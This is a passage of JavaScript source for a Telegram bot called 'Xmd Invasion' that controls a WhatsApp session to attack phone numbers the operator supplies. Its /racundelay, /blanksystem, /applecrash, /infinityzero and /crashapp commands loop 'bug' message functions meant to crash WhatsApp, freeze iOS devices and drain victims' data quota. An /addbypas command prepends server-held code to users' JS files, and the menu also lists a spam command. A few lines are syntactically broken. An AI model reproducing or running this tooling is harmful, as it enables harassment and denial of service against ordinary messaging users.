    console.error("[START VERIF ERROR]", err);
    try { await ctx.editMessageText(progressMsg.chat.id, progressMsg.message_id, undefined, "⚠️ Terjadi kesalahan saat verifikasi. Silakan coba lagi nanti."); } catch (e) {}

    if (devId) {
      try {
      const caption = `\`\`\`EROR\bVERIFIKASI\bVAILED\nUSERNAME: @${username}\nID USER: ${userid}\nEROR: ${err.message || err}\`\`\``;
        await devBot.telegram.sendPhoto(devId, thumbnailUrl, { caption, parse_mode: "Markdown" });
      } catch (e) {}
    }

    return;
  }
});


bot.action('/start', async (ctx) => {
    const menuMessage = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Core° System ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

( ! ) SELLECT THE BUTTON BELOW  
</pre>
</blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜⚙️⌟ ☇ Conntroll Menu",
                callback_data: "/controls"
            },
            {
                text: "⌜🦠⌟ ☇ Bug Menu",
                callback_data: "/bug"
            },
        ],
        [
            {   text: "⌜👥⌟ ☇ Thanks To",
                callback_data: "/tqto"
            },
        ],
        [
            {
               text: "⌜🕹️⌟ ☇ Tols Menu",
               callback_data: "/tols"
            },
        ]
    ];

    try {
        await ctx.editMessageMedia({
            type: 'photo',
            media: thumbnailUrl,
            caption: menuMessage,
            parse_mode: "HTML",
        }, {
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/controls', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Controll° Menu ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

☇ /reqpair - add sender number
☇ /addprem - add premium users
☇ /delprem - delete premium users
☇ /setjeda - settings jeda bug
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ メニューに戻る",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tols', async (ctx) => {
    const controlsMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Controll° Menu ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

☇ /addbypas - add bypas file js
☇ /tiktok - download video tiktok
☇ /tourl - ubah photo/video dll to url
☇ /ig - download video Instagram
☇ /pinterest - cari photo di pin
☇ /brat - buat stiker text
☇ /ipqc - Ss Text iPhone style
☇ /aixmd - Ai helper Chat
☇ /spamngl - Spam Ngl
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ メニューに戻る",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(controlsMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/bug', async (ctx) => {
    const bugMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Menu ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ /racundelay - Delay Message
─▢ /blanksystem - Blank Stuck Logo Mid Device
─▢ /applecrash - Crash Ios System
─▢ /infinityzero - Delay Draining Quota
─▢ /crashapp - Crashing Application Click
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ メニューに戻る",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(bugMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.action('/tqto', async (ctx) => {
    const tqtoMenu = `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX,
I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Tqto° Menu ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ @kyzzexX - Script Developer
─▢ @dithtzy - Script Owner
─▢ @frmnzz25 - Script Support
</pre></blockquote>`;

    const keyboard = [
        [
            {
                text: "⌜🔙⌟ ☇ メニューに戻る",
                callback_data: "/start"
            }
        ]
    ];

    try {
        await ctx.editMessageCaption(tqtoMenu, {
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: keyboard
            }
        });
    } catch (error) {
        if (error.response && error.response.error_code === 400 && error.response.description === "無効な要求: メッセージは変更されませんでした: 新しいメッセージの内容と指定された応答マークアップは、現在のメッセージの内容と応答マークアップと完全に一致しています。") {
            await ctx.answerCbQuery();
        } else {
        }
    }
});

bot.command("racundelay", checkPremium, checkWhatsAppConnection, async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /racundelay 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const remaining = checkCooldown(userId);

  if (remaining > 0) {
    return ctx.reply(`⏳ Tunggu ${remaining} detik sebelum menggunakan command lagi.`);
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Delay Message
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 7; i++) {
    await BugDelayXmd(sock, target);
    await sleep(1500);
    await Qwonzy(sock, target);
    await sleep(1500);
    await BugDelayXmd(sock, target);
    await sleep(1500);
    await Qwonzy(sock, target);
    await sleep(1500);
    console.log(`[🦠] Succes Send Bugs To ${q} broo!!`);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Delay Message 

─▢ Target: ${q}
─▢ Status: Sukses
─▢ Type: Delay Message
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("blanksystem", checkPremium, checkWhatsAppConnection, async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /blanksystem 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const remaining = checkCooldown(userId);

  if (remaining > 0) {
    return ctx.reply(`⏳ Tunggu ${remaining} detik sebelum menggunakan command lagi.`);
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Blank Infinity

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Blank Infinity
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await calledCrash(sock, target);
    await sleep(1500);
    await calledCrash(sock, target);
    await sleep(1500);
    console.log(`[🦠] Succes Send Bugs To ${q} broo!!`);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Blank Infinity

─▢ Target: ${q}
─▢ Status: Sukses
─▢ Type: Blank Infinity
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("applecrash", checkPremium, checkWhatsAppConnection, async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /applecrash 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const remaining = checkCooldown(userId);

  if (remaining > 0) {
    return ctx.reply(`⏳ Tunggu ${remaining} detik sebelum menggunakan command lagi.`);
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Crash Ios System 

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Crash Ios System 
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await TrashIOS(sock, target, true);
    await sleep(1700);
    await crashIosExtend(sock, target);
    await sleep(1700);
    await TrashIOS(sock, target, true);
    await sleep(1700);
    await crashIosExtend(sock, target);
    await sleep(1700);
    console.log(`[🦠] Succes Send Bugs To ${q} broo!!`);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: ( Plugin )

─▢ Target: ${q}
─▢ Status: Sukses
─▢ Type: Crash Ios System
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("infinityzero", checkPremium, checkWhatsAppConnection, async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /infinityzero 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const remaining = checkCooldown(userId);

  if (remaining > 0) {
    return ctx.reply(`⏳ Tunggu ${remaining} detik sebelum menggunakan command lagi.`);
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Draining Quota

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Draining Quota
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 8; i++) {
    await XmdDrainQ(sock, target);
    await sleep(1000);
    await XmdDrainQ(sock, target);
    await sleep(1000);
    await XmdDrainQ(sock, target);
    await sleep(1000)!
    console.log(`[🦠] Succes Send Bugs To ${q} broo!!`);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Draining Quota

─▢ Target: ${q}
─▢ Status: Sukses
─▢ Type: Draining Quota
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

bot.command("crashapp", checkPremium, checkWhatsAppConnection, async ctx => {
  const userId = ctx.from.id;
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /crashapp 62×××`);
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
  
  const remaining = checkCooldown(userId);

  if (remaining > 0) {
    return ctx.reply(`⏳ Tunggu ${remaining} detik sebelum menggunakan command lagi.`);
  }

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl, {
    caption: `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Crashing Application

─▢ Target: ${q}
─▢ Status: Process
─▢ Type: Crashing Application
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 15; i++) {
    await systemXf(sock, target);
    await sleep(2000);
    await systemXf(sock, target);
    await sleep(2000);
    await systemXf(target);
    await sleep(2000);
    console.log(`[🦠] Succes Send Bugs To ${q} broo!!`);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `
<blockquote><pre>メッ\b|\b\bX\bM\bD\b\bI\bN\bV\bA\bS\bI\bO\bN
──────────────────────────────    
Olaaa ${ctx.from.first_name}, I am a telegram bot created by @kyzzexX, I can send bug functions that cause WhatsApp to crash, Use me wisely
スパムしないでください

⌜ Xmd Invasion ☇ Bug° Status ⌟
⬡ Author: @kyzzexX
⬡ Version: 3.0
⬡ Prefix: /
⬡ InterFace: Button Type
⬡ Type: Crashing Application 

─▢ Target: ${q}
─▢ Status: Sukses
─▢ Type: Crashing Application
</pre></blockquote>
</pre></blockquote>© Archimedés D'frmnzz</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[
        { text: "⌜📱⌟ ☇ Cek Target", url: `https://wa.me/${q}` }
      ]]
    }
  });
});

async function downloadFile(url, destPath, opts = {}) {
  const maxAttempts = opts.maxAttempts || 3;
  const attemptDelayMs = opts.attemptDelayMs || 2000;

  // ensure temp dir exists
  const dir = path.dirname(destPath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  let attempt = 0;

  return new Promise((resolve, reject) => {
    const tryDownload = () => {
      attempt++;
      const fileStream = fs.createWriteStream(destPath);
      let downloaded = 0;
      let finished = false;

      const req = https.get(url, (res) => {
        if (res.statusCode >= 300 && res.statusCode < 400 && res.headers.location) {
          // follow manual redirect once
          if (attempt <= maxAttempts) {
            // cleanup and retry with redirected url
            fileStream.close();
            fs.unlinkSync(destPath);
            return downloadFile(res.headers.location, destPath, opts).then(resolve).catch(reject);
          } else {
            fileStream.close();
            return reject(new Error(`Too many redirects or redirect loop`));
          }
        }

        if (res.statusCode !== 200) {
          fileStream.close();
          fs.unlinkSync(destPath, { force: true });
          return reject(new Error(`Download failed. HTTP status ${res.statusCode}`));
        }

        res.on("data", (chunk) => {
          downloaded += chunk.length;
          // optional: you can emit progress events here
          process.stdout.write(`\r⬇️ ${Math.round(downloaded / 1024 / 1024)} MB downloaded`);
        });

        res.pipe(fileStream);

        fileStream.on("finish", () => {
          finished = true;
          fileStream.close(() => resolve(destPath));
        });
      });

      req.on("error", (err) => {
        // cleanup partial file
        try { fileStream.close(); } catch (e) {}
        try { fs.unlinkSync(destPath); } catch (e) {}
        if (attempt < maxAttempts) {
          setTimeout(tryDownload, attemptDelayMs);
        } else {
          reject(err);
        }
      });

      // safety timeout (in case)
      req.setTimeout(opts.timeout || 120000, () => {
        req.destroy(new Error("Request timeout"));
      });
    };

    tryDownload();
  });
}

// ----- helper: get Telegram file link and download to path -----
async function getFileContent(ctx, fileId, savePath) {
  const link = await ctx.telegram.getFileLink(fileId);
  // node-fetch style link -> url is link.href
  return downloadFile(link.href, savePath, { maxAttempts: 3, timeout: 180000 });
}

// ----- helper: combine two files into one by streaming (no full memory load) -----
// write fileA first, then append fileB
async function combineFiles(fileAPath, fileBPath, destPath) {
  // ensure dest dir
  const dir = path.dirname(destPath);
  if (!fs.existsSync(dir)) fs.mkdirSync(dir, { recursive: true });

  return new Promise((resolve, reject) => {
    const out = fs.createWriteStream(destPath);

    const streamA = fs.createReadStream(fileAPath);
    streamA.pipe(out, { end: false });
    streamA.on("error", (err) => {
      out.destroy();
      reject(err);
    });
    streamA.on("end", () => {
      const streamB = fs.createReadStream(fileBPath);
      streamB.pipe(out);
      streamB.on("error", (err) => {
        out.destroy();
        reject(err);
      });
      streamB.on("end", () => {
        out.end();
      });
    });

    out.on("finish", () => resolve(destPath));
    out.on("error", (err) => reject(err));
  });
}

// ----- command handler -----
bot.command("addbypas", checkPremium, async (ctx) => {
  const replied = ctx.message.reply_to_message;
  if (!replied || !replied.document) {
    return ctx.reply("⚠️ Harus reply ke file `.js` / `.txt` yang mau ditambah code.");
  }

  const file = replied.document;
  const fileName = file.file_name || `file_${Date.now()}`;
  const ext = path.extname(fileName).toLowerCase();
  if (![".js", ".txt"].includes(ext)) {
    return ctx.reply("❌ Hanya file `.js` atau `.txt` yang didukung.");
  }

  // show initial progress message
  const progressMsg = await ctx.reply("```>\bPROSESING.....```", { parse_mode: "MarkdownV2" });

  // Prepare paths
  const tempDir = path.join(process.cwd(), "temp");
  if (!fs.existsSync(tempDir)) fs.mkdirSync(tempDir, { recursive: true });

  const originalPath = path.join(tempDir, `orig_${Date.now()}_${fileName}`);
  const headerPath = path.join(process.cwd(), "./database/code.js"); // must exist
  const combinedPath = path.join(tempDir, `COMBINED_${Date.now()}_${fileName}`);

  try {
    // 1) download original file via streaming (supports large file)
    await ctx.telegram.sendChatAction(ctx.chat.id, "upload_document"); // show typing/upload action
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, "> Mendownload file...");

    await getFileContent(ctx, file.file_id, originalPath);

    // 2) ensure header (code.js) exists
    if (!fs.existsSync(headerPath)) {
      throw new Error("code.js tidak ditemukan di server. Letakkan file code.js di root project.");
    }

    // 3) combine header + original file into combinedPath (streaming)
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, "> Menggabungkan file...");
    await combineFiles(headerPath, originalPath, combinedPath);

    // 4) send combined file back
    const newFileName = `CODE BYPAS XMD ${fileName}`;
    await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, "> Mengirim file hasil...");

    await ctx.replyWithDocument(
      { source: combinedPath, filename: newFileName },
      {
        caption: '```\n✅ CODE BYPAS BERHASIL DITAMBAHKAN\n```',
        parse_mode: 'MarkdownV2',
        reply_to_message_id: ctx.message.message_id,
        ...Markup.inlineKeyboard([
          [Markup.button.url('Developer', 'https://t.me/KyzzexX')]
        ])
      }
    );

    // success: delete temp files
    try { fs.unlinkSync(originalPath); } catch (e) {}
    try { fs.unlinkSync(combinedPath); } catch (e) {}

    await ctx.telegram.deleteMessage(ctx.chat.id, progressMsg.message_id).catch(() => {});
  } catch (err) {
    console.error("Process error:", err);
    // cleanup on error
    try { if (fs.existsSync(originalPath)) fs.unlinkSync(originalPath); } catch(e){}
    try { if (fs.existsSync(combinedPath)) fs.unlinkSync(combinedPath); } catch(e){}
    try { await ctx.telegram.editMessageText(ctx.chat.id, progressMsg.message_id, null, "❌ Terjadi kesalahan saat memproses file."); } catch(e){}
    await ctx.reply("❌ Terjadi kesalahan saat memproses file.");
  }
});

bot.command("tourl", async (ctx) => {
  const replied = ctx.message.reply_to_message;

  if (!replied || (!replied.photo && !replied.document && !replied.video && !replied.audio)) {
    return ctx.reply("❌ Reply sebuah *foto/video/audio/file* dengan perintah `/tourl` untuk mengubah jadi link.", { parse_mode: "Markdown" });
  }

  try {
    let fileId;
    let fileName;

    if (replied.photo) {
      // Ambil resolusi terbesar
      fileId = replied.photo[replied.photo.length - 1].file_id;
      fileName = `${fileId}.jpg`;
    } else if (replied.document) {
      fileId = replied.document.file_id;
      fileName = replied.document.file_name;
    } else if (replied.video) {
      fileId = replied.video.file_id;
      fileName = replied.video.file_name || `${fileId}.mp4`;
    } else if (replied.audio) {
      fileId = replied.audio.file_id;
      fileName = replied.audio.file_name || `${fileId}.mp3`;
    }

    // Ambil link file Telegram
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // Download file sebagai buffer
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });

    // Upload ke Catbox
    const form = new FormData();
    form.append("reqtype", "fileupload");
    form.append("fileToUpload", Buffer.from(response.data), { filename: fileName });

    const upload = await axios.post("https://catbox.moe/user/api.php", form, { headers: form.getHeaders() });

    ctx.reply(`✅ *File berhasil diupload!*\n\n🌐 Link: ${upload.data}`, { parse_mode: "Markdown" });
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Terjadi error saat upload file ke Catbox.");
  }
});


// TikTok
bot.command("tiktok", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url || !/(tiktok\.com|vm\.tiktok\.com|vt\.tiktok\.com)/i.test(url)) {
    return ctx.reply("❌ Format link TikTok tidak valid.", { parse_mode: "Markdown" });
  }

  const processingMsg = await ctx.reply("⏳ Mengunduh video TikTok...");

  try {
    const params = new URLSearchParams();
    params.set("url", url);
    params.set("hd", "1");

    const res = await axios.post("https://tikwm.com/api/", params.toString(), {
      headers: { "Content-Type": "application/x-www-form-urlencoded" }
    });

    await ctx.deleteMessage(processingMsg.message_id).catch(() => {});

    const data = res.data;
    if (!data?.data?.play) return ctx.reply("❌ Video tidak ditemukan.");

    await ctx.replyWithVideo(data.data.play, {
      caption: `🎵 ${data.data.title || "Video TikTok"}\n🔗 ${url}`,
      supports_streaming: true
    });

    if (data.data.music) {
      await ctx.replyWithAudio(data.data.music, { title: "Audio Original" });
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat download TikTok.");
  }
});

// Instagram
bot.command("ig", async (ctx) => {
  const url = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!url) return ctx.reply("❌ Format salah!\n\nGunakan `/ig <link Instagram>`", { parse_mode: "Markdown" });

  try {
    const apiUrl = `https://api.diioffc.web.id/api/download/instagram?url=${encodeURIComponent(url)}`;
    const { data } = await axios.get(apiUrl);

    if (!data || !data.result) return ctx.reply("❌ Tidak ada media ditemukan.");

    const mediaList = Array.isArray(data.result) ? data.result : [data.result];
    for (const media of mediaList) {
      if (media.url.includes(".mp4")) {
        await ctx.replyWithVideo(media.url, { caption: "📥 Instagram Video" });
      } else {
        await ctx.replyWithPhoto(media.url, { caption: "📥 Instagram Photo" });
      }
    }
  } catch (err) {
    console.error(err);
    ctx.reply("❌ Error saat mengambil media IG.");
  }
});

// BRAT
bot.command("brat", async (ctx) => {
  const text = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!text) return ctx.reply("❌ Missing input. Example:\n/brat Hallo All");

  const apiUrl = `https://api.nvidiabotz.xyz/imagecreator/bratv?text=${encodeURIComponent(text)}`;

  try {
    await ctx.replyWithPhoto(apiUrl, {
      caption: `🖼️ Brat Image Generated\n\n✏️ Text: *${text}*`,
      parse_mode: "Markdown"
    });
  } catch (err) {
    console.error("Brat API Error:", err);
    ctx.reply("❌ Error generating Brat image. Please try again later.");
  }
});

// Pinterest
bot.command("pinterest", async (ctx) => {
  const query = ctx.message.text.split(" ").slice(1).join(" ").trim();
  if (!query) return ctx.reply("❌ Missing input. Example:\n/pinterest iPhone 17 Pro Max");

  const apiUrl = `https://api.nvidiabotz.xyz/search/pinterest?q=${encodeURIComponent(query)}`;

  https.get(apiUrl, (res) => {
    let body = "";
    res.on("data", chunk => body += chunk);
    res.on("end", async () => {
      try {
        const data = JSON.parse(body);
        if (!data || !data.result || data.result.length === 0) {
          return ctx.reply("❌ No Pinterest images found for your query.");
        }
        const firstResult = data.result[0];
        await ctx.replyWithPhoto(firstResult, {
          caption: `📌 Pinterest Result for: *${query}*`,
          parse_mode: "Markdown"
        });
      } catch (err) {
        console.error("Pinterest API Error:", err);
        ctx.reply("❌ Error fetching Pinterest image. Please try again later.");
      }
    });
  }).on("error", (err) => {
    console.error("HTTPS Error:", err);
    ctx.reply("❌ Failed to connect to Pinterest API.");
  });
});

const API_URL = "https://brat.siputzx.my.id/iphone-quoted";

